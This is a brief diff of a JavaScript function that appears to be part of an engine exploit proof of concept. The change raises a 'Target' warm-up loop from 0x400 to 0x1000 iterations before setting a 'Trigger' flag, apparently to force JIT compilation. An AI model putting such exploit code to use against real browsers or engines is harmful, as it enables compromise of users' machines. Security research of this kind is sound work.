@@ -22,7 +22,7 @@ function main() {
     const Snowflake = new SoSpecial();
     Arr = new Array(0x7);
     Arr.fill(1337); 
-    for (let Idx = 0; Idx < 0x400; Idx++) {
+    for (let Idx = 0; Idx < 0x1000; Idx++) {
         Target(Snowflake, 0x0); 
     }
     Trigger = true;
